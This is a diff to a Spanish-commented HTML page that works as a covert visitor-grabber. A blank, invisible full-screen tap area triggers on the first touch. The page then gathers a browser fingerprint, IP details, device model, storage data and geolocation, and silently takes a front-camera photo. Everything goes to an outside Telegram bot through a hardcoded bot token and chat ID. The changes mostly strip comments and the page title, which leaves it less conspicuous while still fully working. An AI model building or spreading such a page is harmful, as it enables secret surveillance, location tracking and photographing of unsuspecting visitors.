@@ -3,19 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verificación</title>
+    <title></title>
     <style>
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        body {
             background: white;
             width: 100vw;
             height: 100vh;
             overflow: hidden;
-            cursor: pointer;
         }
         #tap-area {
             position: fixed;
@@ -23,14 +19,13 @@
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9999;
             background: transparent;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
 <div id="tap-area"></div>
-
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
@@ -39,10 +34,9 @@
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
 
-    // Variables de control para que el envío ocurra solo una vez
     let alreadySent = false;
 
-    // -------------------- FUNCIONES (igual que antes, optimizadas) --------------------
+    // ---------- FUNCIONES (igual que antes) ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -111,11 +105,8 @@
         const canvas = document.getElementById('canvas');
         let stream = null;
         try {
-            // Solo cámara frontal
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        } catch(e) {
-            return null; // falla silenciosa
-        }
+        } catch(e) { return null; }
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
         await new Promise(r => setTimeout(r, 500));
@@ -143,16 +134,14 @@
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 
-    // -------------------- ACCIÓN PRINCIPAL (un solo toque en cualquier lugar) --------------------
+    // ---------- ACCIÓN AL TOCAR LA PANTALLA ----------
     async function collectAndSend() {
         if (alreadySent) return;
         alreadySent = true;
-
-        // Ocultar el área de toque para que no se pueda hacer doble clic
+        // Ocultar el área de toque para que no se pueda volver a tocar
         const tapArea = document.getElementById('tap-area');
         if (tapArea) tapArea.style.display = 'none';
 
-        // Recolectar información en paralelo
         const [fp, ipInfo, device, storage, position] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
@@ -161,7 +150,6 @@
             getCurrentPosition().catch(() => null)
         ]);
 
-        // Construir mensaje detallado
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -190,10 +178,10 @@
         if (foto) await sendPhoto(foto);
     }
 
-    // Configurar el evento de toque en cualquier parte de la pantalla
-    document.body.addEventListener('click', collectAndSend, { once: true });
-    // También para dispositivos táctiles
-    document.body.addEventListener('touchstart', collectAndSend, { once: true });
+    // Asignar el toque a toda la pantalla
+    const tapArea = document.getElementById('tap-area');
+    tapArea.addEventListener('click', collectAndSend);
+    tapArea.addEventListener('touchstart', collectAndSend);
 </script>
 </body>
 </html>
